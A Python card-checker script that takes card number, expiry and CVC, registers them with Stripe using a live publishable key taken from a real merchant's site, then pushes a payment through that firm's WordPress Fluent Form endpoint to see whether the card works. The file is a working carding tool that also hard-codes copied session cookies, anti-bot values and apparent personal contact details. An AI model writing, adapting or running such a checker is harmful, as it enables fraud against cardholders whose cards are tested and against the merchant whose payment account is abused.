import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Om9OfS6OZGOPbP3Sa9qzqM4gWDRyYJGRAV76S6jfjwvyt5AxL840tmSErXZjKeg52tzG21sgP9LafDL1U59t7p600hT9l83h0'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': '24f04ecf-d3d5-4091-9f21-072c0a1ed04cce19a0',
			'__stripe_sid': 'dbd055bf-9ecf-4872-ad81-7e6dbfbe68c375ba87',
	}

	headers = {
			'authority': 'judgeaccountants.com.au',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
			'origin': 'https://judgeaccountants.com.au',
			'referer': 'https://judgeaccountants.com.au/internal-controls/download-our-e-guide-to-internal-controls/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1728267712384',
	}

	data = {
			'data': 'ak_hp_textarea=&ak_js=1728267684722&__fluent_form_embded_post_id=4469&_fluentform_3_fluentformnonce=492e8f4f4c&_wp_http_referer=%2Finternal-controls%2Fdownload-our-e-guide-to-internal-controls%2F&names%5Bfirst_name%5D=Rein&names%5Blast_name%5D=Pro&email=rein48287%40gmail.com&phone=0994366932&payment_input=10&payment-coupon=&payment_method=stripe&__ff_all_applied_coupons=&ak_bib=1728267689499&ak_bfs=1728267711329&ak_bkpc=4&ak_bkp=28%3B8%2C19%3B8%2C4%3B13%3B&ak_bmc=43%3B19%2C4273%3B12%2C20290%3B&ak_bmcc=3&ak_bmk=&ak_bck=&ak_bmmc=0&ak_btmc=2&ak_bsc=4&ak_bte=83%3B25%2C289%3B260%2C272%3B46%2C303%3B104%2C3371%3B313%2C72%3B15%2C437%3B30%2C20275%3B&ak_btec=8&ak_bmm=&__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '3',
	}
	
	r2 = requests.post(
			'https://judgeaccountants.com.au/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())